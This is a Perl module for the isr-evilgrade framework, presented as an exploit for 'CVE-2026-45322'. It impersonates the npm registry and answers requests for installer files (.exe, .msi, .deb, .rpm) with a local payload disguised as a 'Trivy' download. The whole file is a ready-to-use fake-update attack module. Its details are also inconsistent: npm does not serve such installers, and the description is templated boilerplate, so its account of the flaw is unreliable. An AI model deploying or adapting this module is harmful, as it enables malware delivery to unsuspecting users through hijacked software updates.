###############
# npm_trivy_scanner.pm
#
# CVE-2026-45322: Supply Chain Vulnerability
# Type: Supply Chain
# CVSS: 8.8
# Year: 2026
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.

package modules::npm_trivy_scanner;

use strict;
use Data::Dump qw(dump);
use isrcore::utils;

my $base = {
    'name'        => 'npm_trivy_scanner',
    'version'     => '1.0',
    'cvss'        => '8.8',
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com>', 'Security Research Team'],
    'description' => qq{
Exploits CVE-2026-45322: Supply Chain vulnerability.
CVSS Score: 8.8
Vector: Supply Chain
Year Disclosed: 2026
Payload: Trivy
    },
    'vh' => 'registry.npmjs.*',
    'request' => [
        {
            'req'   => '/.*\\.exe|\\.msi|\\.pkg|\\.deb|\\.rpm',
            'type'  => 'file',
            'file'  => './include/npm_trivy_scanner/payload.bin',
            'parse' => 1,
            'cheader' => "HTTP/1.1 200 OK\r\n"
                . "Content-Type: application/octet-stream\r\n"
                . "Content-Disposition: attachment; filename=Trivy\r\n"
                . "Connection: close\r\n\r\n",
        },
    ],
};

sub new {
    my $class = shift;
    my $self = $base;
    bless( $self, $class );
    return $self;
}

1;
